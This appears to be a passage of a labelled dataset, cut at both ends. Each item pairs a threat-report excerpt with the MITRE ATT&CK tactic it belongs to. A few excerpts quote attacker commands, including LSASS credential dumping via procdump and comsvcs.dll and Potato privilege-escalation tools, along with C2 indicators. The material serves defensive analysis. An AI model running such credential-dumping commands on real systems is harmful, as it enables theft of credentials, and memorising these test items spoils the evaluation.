        "input": "Described attack activity: SolarWinds confirmed that less than 18,000 of its 300,000 customers have downloaded the compromised update. Still, the effects of this campaign are potentially staggering, with the company's products being used by several high-value entities. Victims reportedly include government agencies and consulting, technology, telecom, and oil and gas companies in North America, Europe, Asia and the Middle East, according to FireEye. Several reports also indicate that the U.S. Treasury and Commerce departments were also targeted in what is likely related to the same activity. ",
        "output": "impact",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: TheRcloneutility was used to collect information from file shares and to exfiltrate the data.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For command and control, the threat actor used two main tools, Cobalt Strike and SystemBC.\nCobalt Strike\nOverview of Cobalt Strike traffic beaconing pattern over intrusion:\nThe initial Cobalt Strike beacon, delivered via RtWin64.exe on the beachhead host, maintained a continuous command and control domain at svchorst[.]com throughout the entire infection. The IP address associated with the domain changed over time, and the communication process also shifted as queries were injected into different processes by RtWin64.exe.\nTo further obfuscate its presence, the threat actor initially routed the Cobalt Strike command and control traffic through CloudFlare's CDN service, effectively attempting to hide in plain sight by blending into legitimate web traffic.\nThe 104[.]21.76.140 and 172[.]67.196.25 addresses belonged to Cloudflare.\nLater in the intrusion, the command and control (C2) server moved away from CloudFlare, and subsequently, the domain resolved to an AWS IP address.\nDNS queries performed for svchorst[.]com:\nNetwork connections to svchorst[.]com:\nUsing Didier Steven's great tool1768.py, we successfully extracted the configuration of the Cobalt Strike beacon, which validated the host artifacts discovered on the beachhead host.\nIn the rest of the infrastructure, two distinct types of Cobalt Strike beacons were deployed: HTTPS beacons and SMB beacons. The HTTPS beacons appeared to communicate with three different domains-wq[.]regsvcast[.]com, as[.]regsvcast[.]com, and zx[.]regsvcast[.]com-though, in reality, only wq[.]regsvcast[.]com was actively used, resolving to IP address 147.78.47[.]178. This Cobalt Strike server was tracked as active by the DFIR Threat Feeds from December 21st through Jan 6th, 2024.\nSysmon event ID 22 helped document the DNS queries related to the *regsvcast[.]com domains, providing further insight into the network activity tied to the Cobalt Strike infrastructure.\nSysmon event ID 3 logs every network connection made, provided it's not disabled in the Sysmon configuration. This can be particularly useful, as some EDR solutions apply rate limits to this type of artifact.\nSince Cobalt Strike beacons can generate significant traffic, the volume of network connections for each beacon can be observed in the final column of these logs, highlighting the frequency and noisiness of the communication between beacons and command and control infrastructure.\nBelow is the configuration of the beacon from DC Y which communicated encrypted over https on port 443:\nOne C2 connection from the Cobalt Strike beacons stands out from the rest: it originates from PowerShell but communicates over HTTP to port 80.\nCommunicating in clear text gives us the opportunity to look at what is going on. The threat actor used PowerShell to perform the download:\nUsing Wireshark to view the exact HTTP query to the C2 server:\nA PowerShell script was downloaded that decodes a Base64-encoded blob using `FromBase64String`. At the end of the script, the decoded data is decompressed, which can easily be done using tools like `gunzip`. This behavior is highly indicative of a Cobalt Strike PowerShell stager. Upon decoding the Base64 blob, we uncovered another embedded PowerShell script.\nThis PowerShell script decodes another base64 blob, but as we can see it also performs XOR operations on the bytes. XOR with decimal 35(0x23) is a well known key for Cobalt Strike PowerShell stagers.\nAfter decoding the final base64 blob we get the Cobalt Strike beacon and can get the configuration (as the configuration is the same on all HTTP beacons the config is extracted withcsce):\nSytemBC\nAnother command and control channel utilized by the threat actor in this intrusion was SystemBC, a tool frequently favored by ransomware groups. One of its most commonly used features is its proxy functionality. This allowed the threat actor to leverage their own external computers and, through the SystemBC malware deployed on the file server, establish proxy connections to access the local network, facilitating further actions within the compromised environment.\nThe threat actor first brought in SystemBC as a file named SC.exe. This was executed manually by the threat actor after logging into the file server from DC X.\nSecurity EventID 4624 showing RDP logon and Logon ID:\nThe threat actor manually started SystemBC with name SC.exe:\nNotice that the original name is different and that the LogonID is the same as from the RDP login above.\nShortly after the threat actor brought another SystemBC file, with the name socks32.exe. That was moved to the file server from DC X.\nsocks32.exe moved over SMB C$ share:\nOnce again execution is done manually after logging in through RDP.\nRDP logon:\nManual execution:\nIf the SystemBC sample is compiled without modifications, it should be feasible to extract the configuration from the implant by examining the exe file, as all information is presented in plain text.\nPort and host configuration for SystemBC in the socks32.exe implant:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat actors used multiple command and control servers to interact with the compromised environment.\nBumbleBee C2\nCobalt Strike\nCobalt Strike Server Config:\nMeterpreter",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BazarLoader initial communication with the C2 is over HTTPS. Data is sent to the C2 via the cookie parameter(screenshot taken fromhttps://tria.ge/210716-v4jh8hf6ea/behavioral2).\nTwenty minutes after the initial execution, BazarLoader downloaded and executed Cobalt Strike beacon with the help of rundll32.exe.\nThe AnyDesk software installed by the threat actors maintained a constant connection to the Anydesk infrastructure for the duration of the intrusion.\nAnyDesk:\nSome network oddities appeared several times during the course of the intrusion. One of those oddities was several connections across the intrusion to an XMPP chat server at chatterboxtown.us at 70.35.205.161. These connections originated from one of the Cobalt Strike processes over port 5222. The goal of this traffic was not discovered in the course of the investigation.\nAnother, was a brief SSH connection to a server on the internet using Putty.\nThe connection took place for a period of twenty minutes. The reason for this connection is unknown. According to public records, the IP is associated with an old Cobalt Strike C2 server.\nBazarLoader:\nCobalt Strike:\nyawero.com (45.153.240.234:443) This Cobalt Strike server was added to ourThreat Feedon 07/19/2021.\nsazoya.com (23.106.160.77:443) This Cobalt Strike server was added to ourThreat Feedon 07/29/2021.\nsazoya.com (192.198.86.130:443) This Cobalt Strike server was added to ourThreat Feedon 07/29/2021. The IP appeared previously tied to a different domain on 05/11/2021.\nCobalt Strike:\ngojihu.com (23.106.215.61:443) This Cobalt Strike server was added to ourThreat Feedon 07/19/2021.\nyuxicu.com (23.82.19.173:443) This Cobalt Strike server was added to ourThreat Feedon 07/19/2021.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attack typically begins with the compromise of a user within a trusted vendor. After compromising the trusted vendor, the threat actor hosts a file on the vendor's file hosting service, which is then shared with a target organization. This misuse of legitimate file hosting services is particularly effective because recipients are more likely to trust emails from known vendors, allowing threat actors to bypass security measures and compromise identities. Often, users from trusted vendors are added to allow lists through policies set by the organization on Exchange Online products, enabling phishing emails to be successfully delivered. \nWhile file names observed in these campaigns also included the recipients, the hosted files typically follow these patterns: \nFamiliar topics based on existing conversations For example, if the two organizations have prior interactions related to an audit, the shared files could be named \"Audit Report 2024\".   \nFamiliar topics based on current context If the attack has not originated from a trusted vendor, the threat actor often impersonates administrators or help desk or IT support personnel in the sender display name and uses a file name such as \"IT Filing Support $2024^{\\prime\\prime}$ , \"Forms related to Tax submission\", or \"Troubleshooting guidelines\".   \nTopics based on urgency Another common technique observed by the threat actors creating these files is that they create a sense of urgency with the file names like \"Urgent:Attention Required\" and \"Compromised Password Reset\". ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For its persistence malware employs various methods. Its behavior depends on the availability of the PowerShell interpreter and the privileges granted to the process. Typically, the malware would be running with administrative privileges when installed via the exploit, and with user-level privileges when delivered via the Cygwin SSH server. \nIf the PowerShell is not present, the malware generates a hidden file with MZ-PE loader with a randomized name located in %APPDATA% directory. This loader includes a copy of system.img and is subsequently registered with a GUID-like name within the Windows registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run. \nIf PowerShell is installed, it will behave differently based on whether administrative access is available. If administrative rights are present, its ether executes a PowerShell script that creates two task scheduler entries with GUID-like names and with different triggers. The action of these tasks is run of PowerShell loader script. \nIf administrative rights are unavailable, the PowerShell script loader, is surrounded thousands of spaces in the beginning and in the end, is placed in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets registry key, which is then registered in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key with the following command: \n'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets').  \n%RegValNameFromPrevStep%')\".\nOn both cases when PowerShell is available, the body of malware archive itself is stored inside the registry key Software\\Microsoft\\Windows\\CurrentVersion\\Shell, Base64 encoded and surrounded with hundreds of spaces, and is started by mentioned above PowerShell scripts. \nOn Linux hosts the malware process hides itself under name (sd-pam). And has a rich set of ways to establish persistence: it may be system or user systemd service, autostarted .desktop file, or additional line inside one of suitable /etc/rc\\*, profile, bashrc or inittab file. The malware executable file is placed in /tmp directory with a random name. ",
        "output": "persistence",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Trickbot payload seen during this intrusion was likely spread via a weaponized Word or Excel file from an email campaign.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Local and domain user credentials were collected, on a few key systems, by dumping the LSASS process memory and extracting credentials with Microsoft Sysinternals Procdump and Dumpert: \nc:\\windows\\system\\procdump.exe -accepteula -ma lsass.exe lsass.dmp c:\\windows\\system\\dumpert.exe lsass.exe \nDuring the BlackMatter attack, the attacker used comsvcs.dll directly to dump LSASS memory: \npowershell rundll32.exe c:\\windows\\system32\\comsvcs.dll, minidump (get-process lsass).id c:\\temp\\lsass.dmp full \nBeyond the Windows login credentials, during the BlackCat attack, the attackers used a tool named \"steal.exe\" to harvest additional data. We could not obtain the binary, but based on the creation of a results folder with an \"archive.zip\" file inside it, we believe the tool may be HackBrowserData, or a version of it. \nThe following commands were used on a few systems: \ncmd.exe /q /c steal.exe 1> \\\\127.0.0.1\\admin\\$\\__<num>.<num> 2>&1 cmd.exe /q /c cd results   \n1> \\\\127.0.0.1\\admin\\$\\__<num>.<num> 2>&1 cmd.exe /q /c dir 1>   \n\\\\127.0.0.1\\admin\\$\\__<num>.<num> 2>&1  cmd.exe /q /c del archive.zip 1>   \n\\\\127.0.0.1\\admin\\$\\__<num>.<num> 2>&1 cmd.exe /q /c del c:\\steal.exe 1>   \n\\\\127.0.0.1\\admin\\$\\__<num>.<num> 2>&1 ",
        "output": "credential access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1027: Obfuscated Files or Information T1070: Indicator Removal T1070.003: Clear Command History T1070.004: File Deletion   \nT1078: Valid Accounts T1140: Deobfuscate/Decode Files or   \nInformation T1202: Indirect Command Execution T1218.011: Rundll32 T1222: File and Directory Permissions   \nModification T1497: Virtualization/Sandbox Evasion T1497.001: System Checks T1620: Reflective Code Loading ",
        "output": "defense evasion",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Talos IR observed that the attacker primarily used Remote Desktop Protocol (RDP) and several compromised credentials to move between systems.  Further analysis showed that the attacker has also used AnyDesk and possibly LogMeIn to allow remote connectivity. We also spotted the installation of PuTTY on the compromised machines, which was likely used to move laterally to Linux hosts. We are not clear how these tools were dropped and executed on the infected machines. \nSample RDP command executions observed during our analysis and with the redacted IP address details are shown below. \nmstsc /v 10.\\*.\\*.\\* .\\conhost.exe -d \\10.\\*.\\*.\\*\\e\\$ ",
        "output": "lateral movement",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Scheduled Tasks\nWe identified multiple scheduled tasks across several systems within the environment. These tasks were not limited to the beachhead host but were observed throughout the compromised network.\nExample scheduled task configuration XML:\nRegistry Run Key\nAs a second method of persistence, the threat actor utilized a \"Run\" key in the Windows registry to enable the automatic execution of a GhostSOCKS payload upon user login. This was accomplished through the following PowerShell command:",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Truebot was used to load both Cobalt Strike and FlawedGrace on the initial host.\nTruebot\nThe payload, Document_may_24_16654.exe, imitated a PDF document by using an icon of an Adobe Acrobat document.\nThis was further enforced upon the user when the malware created the following message claiming Adobe Acrobat failed to open the file (even if Acrobat was not installed on the target system).\nTruebot's first action was to create an exact copy of itself in the following path and then execute it.\nThe newly created copy reached out to the Truebot C2 of essadonio[.]com (45.182.189[.]71).\nCobalt Strike\nTruebot spawned an instance of C:\\Windows\\system32\\cmd.exe which was followed-up by a remote thread created in the new process. The memory of cmd.exe clearly indicated signs of injection, as seen below, where a section of memory was set to execute and read write as well as the telltale MZ (0x4d5a) header of a PE binary.\nFurther investigation identified the injected module beacon.dll at the same offset as above (0x164a2fb0000) in the loaded modules of the target process.\nThis is the default naming convention for generating payloads from Cobalt Strike, and stands out further as the DLL did not have a path on disk.\nThis Cobalt Strike beacon was used both to query information and move around the network which will be discussed in later sections.\nDuring the intrusion, the process running the beacon spawned the following process command line:\nAs we have observed in previous cases, threat actors make mistakes too! In this case, theshellargument is a beacon command to spawn a new process. Here, we see it mashed between two commands indicating human error.\nFlawedGrace\nTruebot loaded another more complicated payload alongside Cobalt Strike, the Remote Access Trojan (RAT) \"FlawedGrace.\" The initial execution chain of this malware was observed across multiple endpoints when they were first infected.\nThe first observed behavior of this chain was to create a new instance of spoolsv.exe that was shortly accessed by the Truebot process (RuntimeBroker.exe). This process would then spawn instances of msiexec.exe, which would reach out to the initial FlawedGrace C2 of 92.118.36[.]199.\nInstead of creating a task through schtasks.exe, FlawedGrace used three different methods to create new scheduled tasks. The first was to import the taskschd.dll library into the main host process to create a new task called 2. The task was removed as soon as the new command gained SYSTEM-level privileges.\nThe second was observed within obfuscated PowerShell, where the Schedule.Service COM Object was used to create a new task.\nThe last method was to use native PowerShell cmdlets to register a task.\nThe initial task \\2 ran the following command which was scheduled for the next minute after creation:\nThe first working part of the command decodes the obfuscated string and results in the following PowerShell code:\nThe decoded code sets the variable $j to the value {8D81676C-7F63-8F81-676E-666B6C67818D}. It then reads a value from the Windows Registry under the SOFTWARE\\2\\CLSID\\{8D81676C-7F63-8F81-676E-666B6C67818D}\\Type key, converts the value to a UTF-8 string, and executes it.\nBased on script block logging, the PowerShell script contained in the registry would manipulate and populate further registry keys in the HKLM:\\Software\\Classes\\CLSID\\ key using HKLM:\\Software\\2\\CLSID as a staging location. The malware created specific key names attempting to blend in with other COM objects which were also kept within this location. The malware would create additional scheduled tasks using one of the following names selected randomly:\nThe final loaded PowerShell script was stored here:\nThe PowerShell code in TypeLib would decrypt the RC4 encrypted payload stored in ProgID using a key based on the hostname ($env:COMPUTERNAME) of the target host and then inject the DLL into the FlawedGrace msiexec.exe and svchost.exe processes.\nThe encrypted DLL stored in Registry\nWe manually reversed the RC4 function to decrypt the DLL, which matched the same hash as the FlawedGrace processes in memory (c.dll)\nThe PE details of the injected module c.dll was of a DLL with an original name of icuin.dll, claiming to be part of the International Components for Unicode libraries, as see below:\nWhen FlawedGrace attempted to run certain commands on the target host, it displayed the specific behavior of spawning an instance of cmd.exe as a sacrificial intermediate process.\nShortly after these instances of cmd.exe were spawned, they would be accessed by the FlawedGrace process svchost.exe.\nOf note, the arguments in these processes command lines used flags that do not exist (/I, /SI, /O, /SO):\nA Sigma rule to detect this activity can be found at the end of the report.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the account takeover, the threat actor added a new device to the victim's account. This allowed persistent access to the account, even as security efforts were made to lock them out. Figure 12 displays an alert of suspicious resource creation within the Microsoft Azure tenant.\nWhen IT regained control of the account, the attacker immediately initiated a password reset, attempting to regain control. This created a tug-of-war scenario in which both parties struggled for control over the account. This resulted in several additional alerts being triggered within the organization, shown in Figure 13.",
        "output": "persistence",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon exploiting the Exchange vulnerability, the attackers launched the following discovery commands to gather information about the device they had compromised: \ncmd.exe and the commands ver and systeminfo  to collect operating system information net.exe  to determine domain computers, domain controllers, and domain admins in the environment \nAfter executing these commands, the attackers navigated through directories and discovered a passwords folder that granted them access to account credentials they could use in the subsequent stages of the attack. They also used the del command to delete files related to their initial compromise activity. \nThe attackers then mounted a network share using net use and the stolen credentials and began looking for potential lateral movement targets using a combination of methods. First, they used WMIC.exe using the previously gathered device name as the node, launched the command whoami /all, and pinged google.com to check network connectivity. The output of the results were then written to a .log file on the mounted share. Second, the attackers used PowerShell.exe with the cmdlet Get-ADComputer and a filter to gather the last signin event. ",
        "output": "discovery",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once the attackers have gained access to a machine through any of the tools described above, they leverage well-known security testing programs to compromise additional machines on the network. In particular, we found evidence of the following actions on the target: \nMicrosoft's SysInternals suite: ProcDump to dump the exe process and PsExec to run commands on remote hosts. LaZagne and Mimikatz to collect credentials on infected machines. Built-in networking utilities such as ipconfig.exe, net.exe and ping.exe, etc. for network discovery. ",
        "output": "lateral movement",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After gaining initial access, the threat actor began executing scripts, as shown in table 3. \nTable 3: Execution techniques ",
        "output": "execution",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: No exfiltration was observed but honey docs were taken off network and opened by the threat actors from remote locations. We assess that this exfiltration was performed over an encrypted C2 channel. This exfiltration has been going on for months and is rarely talked about when it comes to Wizard Spider.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Modify Registry\nThe threat actor employed an encoded PowerShell command to modify the registry, enabling Remote Desktop Protocol (RDP) access to a file server.\nSetting the registry key \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" DenyTSConnections to 0 will allow terminal server connections to the host.\nProcess Injection\nGiven the threat actor's extensive use of Cobalt Strike beacons, we anticipated the use of process injection as a method of evading detection by hiding within legitimate processes.\nUpon analyzing process injections and access patterns from Cobalt Strike-generated processes, we successfully identified the suspicious activity we were searching for.\nThese injections can then be confirmed using things like YARA memory scanning:",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trickbot was manually executed on a single endpoint. Source:Hatching Triage | Behavioral Report",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On December 2022, we identified a suspicious executable (detected by Trend Micro as Trojan.MSIL.REDCAP.AD) that was dropped and executed on multiple machines. Our investigation led us to link this attack to advanced persistent threat (APT) group APT34, and the main goal is to steal users' credentials. Even in case of a password reset or change, the malware is capable of sending the new credentials to the threat actors. Moreover, after analyzing the backdoor variant deployed, we found the malware capable of new exfiltration techniques - the abuse of compromised mailbox accounts to send stolen data from the internal mail boxes to external mail accounts controlled by the attackers. While not new as a technique, this is the first instance that APT34 used this for their campaign deployment. Following this analysis, it is highly likely that this campaign's routine is only a small part of a bigger chain of deployments. Users and organizations are strongly advised to reinforce their current security measures and to be vigilant of the possible vectors abused for compromise.",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1110.002: Password Cracking T1555.003: Credentials from Web Browsers T1558.003: Kerberoasting ",
        "output": "credential access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1583.003: Virtual Private Server T1588.003: Code Signing Certificates T1588.004: Digital Certificates T1608.003: Install Digital Certificate T1608.005: Link Target ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The attackers were careful to ensure the updates didn't make Astaroth easier to detect; on the contrary, the updates only make Astaroth's activities even more invisible. \nOne of the most significant updates is the use of Alternate Data Stream (ADS), which Astaroth abuses at several stages to perform various activities. ADS is a file attribute that allows a user to attach data to an existing file. The stream data and its size are not visible in File Explorer, so attacks abuse this feature to hide malicious code in plain sight. \nIn the case of Astaroth, attackers hide binary data inside the ADS of the file desktop.ini, without changing the file size. By doing this, the attackers create a haven for the payloads, which are read and decrypted on the fly. \nThe complex attack chain, which involves the use of multiple living-off-the-land binaries (LOLBins), results in the eventual loading of the Astaroth malware directly in memory. When running, Astaroth decrypts plugins that allow it to steal sensitive information, like email passwords and browser passwords. \nIn the succeeding sections, we describe each step of Astaroth's attack chain in detail. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cosmu has a couple of different mechanisms for achieving persistence on the system. It creates a scheduled task and installs a Windows service. \nThe scheduled task is typically named \"Watchmon Service\". It executes the malware at system startup. \nThe service typically has name javamtsup, and the display name is \"Java(TM) Virtual Machine Support Service\". The size of the service binary on disk varies, but typically the real size is 5120 bytes (based on PE headers) and the SHA1 value is 7803f160af428bcfb4b9ea2aba07886f232cde4e. \nThe service itself is very straightforward: it opens a handle to explorer.exe process, duplicates its process token, reads the path of the actual malware binary from registry (key HKLM\\Software\\JavaSoft, value Supplement) and starts the malware using the duplicated process token. \nCosmu copies itself with a couple of different filenames to %WINDIR%\\system32. The binaries on the disk have a variable length of zero-padding but they are all essentially copies of the original malware binary. \nThe filenames for both the Cosmu copies and the service binary are generated by randomly taking two items from the following list and concatenating them, resulting in filenames like usbmon.exe, urllsa.exe, and rasdns.exe: \nyy nt yy fw yy env y inf yy pc yy lib yy svc yy ctf yy ud y ras yy mon yy wm y pptp yy pdb yy win y obj yy ms yy id yy net y cpl yy wdm yy host yy sys y mgr yy lsa yy ui   \ny cms yy schd   \ny dsp yy tapi   \ny sql yy eng   \nyy dhcp yy cfg   \nyy srv yy api   \nyy dns yy fs   \nyy ip yy url ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1098: Account Manipulation T1098.001: Additional Cloud Credentials T1547.009: Shortcut Modification \nT1574.008: Path Interception by Search Order Hijacking ",
        "output": "persistence",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Our analysis did not reveal any instances of APT41 using unique ways of escalating privileges in the network. In addition to the standard capabilities of Cobalt Strike, for such purposes APT41 mainly used additional modules and cna. Publicly available tools for local privilege escalation (such as BadPotato) were also used to establish persistence. Moreover, the attackers used password hashes or accounts obtained at the reconnaissance stage. \ncmd.exe /c c:\\windows\\Temp\\BadPotatoNet4.exe c:\\windows\\Temp\\COMSysCon.exe; execute-assembly C:\\Users\\Administrator\\Desktop\\SweetPotato.exe E:\\Projects\\Operations\\uploads\\documents\\docs\\AxInstSV.exe. ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In May 2019, Microsoft released an out-of-band patch update for remote code execution vulnerabilityCVE-2019-0708, which is also known as \"BlueKeep\" and resides in code to Remote Desktop Services (RDS). This vulnerability is pre-authentication and requires no user interaction, making it particularly dangerous as it has the unsettling potential to be weaponized into a destructive exploit. If successfully exploited, this vulnerability could execute arbitrary code with \"system\" privileges. The Microsoft Security Response Centeradvisoryindicates this vulnerability may also be wormable, a behavior seen in attacks including Wannacry and EsteemAudit. Understanding the seriousness of this vulnerability and its potential impact to the public, Microsoft took the rare step of releasing a patch for the no longer supported Windows XP operating system, in a bid to protect Windows users.\nWith potential global catastrophic ramifications, Unit 42 researchers felt it was important to analyze this vulnerability to understand the inner workings of RDS and how it could be exploited. Our research dives deep into the RDP internals and how they can be leveraged to gain code execution on an unpatched host. This blog discusses how Bitmap Cache protocol data unit (PDU), Refresh Rect PDU, and RDPDR Client Name Request PDU can be used to write data into kernel memory.\nSince the patch was released in May, this vulnerability has received a lot of attention from the Computer Security industry. It is only a matter of time before a working exploit is released in the wild. The findings of our research highlight the risks if vulnerable systems are left unpatched.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access was gained through a malicious document email campaign that aimed to trick the user into enabling Macros.\nThe document was delivered via an email that included a link to Google's Feed Proxy service which was hosting a malicious document as shared by@James_inthe_box. Thanks for sharing James!\nReviewing the document we can see the expected malicious macro and identify the location of a dll to be dropped in the:\nWe can see that this relates to the path:\nAnd once the dll \"ier\" is written there, the macro proceeds to execute it.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Lsass was dumped using Cobalt Strike on multiple occasions. We were not able to recover any proof other than parent/child processes.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Dexphot is not the type of attack that generates mainstream media attention; it's one of the countless malware campaigns that are active at any given time. Its goal is a very common one in cybercriminal circles - to install a coin miner that silently steals computer resources and generates revenue for the attackers - yet Dexphot exemplifies the level of complexity and rate of evolution of even everyday threats, intent on evading protections and motivated to fly under the radar for the prospect of profit. \nTo combat threats, several next-generation protection engines in Microsoft Defender Advanced Threat Protection's antivirus component detect and stop malicious techniques at multiple points along the attack chain. For Dexphot, machine learning-based detections in the cloud recognize and block the DLLs loaded by rundll32.exe, stopping the attack chain in its early stages. Memory scans detect and terminate the loading of malicious code hidden by process hollowing - including the monitoring processes that attempt to update the malware code and re-infect the machine via PowerShell commands. \nBehavioral blocking and containment capabilities are especially effective in defeating Dexphot's fileless techniques, detection evasion, and persistence mechanisms, including the periodic and boot-time attempts to update the malware via scheduled tasks. As mentioned, given the complexity of the attack chain and of Dexphot's persistence methods, we released a remediation solution that prevents re-infection by removing artifacts. \nThe detection, blocking, and remediation of Dexphot on endpoints are exposed in Microsoft Defender Security Center, where Microsoft Defender ATP's rich capabilities like endpoint detection and response, automated investigation and remediation, and others enable security operations teams to investigate and remediate attacks in enterprise environments. With these capabilities, Microsoft Defender ATP provides comprehensive protection against Dexphot and the countless other complex and evolving threats that we face every day. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We were able to identify a likely means of initial access for 23 of the 34 victims that we observed in ESET telemetry. Similar to what was reported in thePowerLessandCISAreports, Ballistic Bobcat probably exploited a known vulnerability,CVE-2021-26855, in Microsoft Exchange servers to gain a foothold on these systems.\nFor 16 of the 34 victims, it appears Ballistic Bobcat was not the only threat actor with access to their systems. This may indicate, along with the wide variety of victims and the apparent lack of obvious intelligence value of a few victims, that Ballistic Bobcat engaged in scan-and-exploit behavior, as opposed to a targeted campaign against preselected victims.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
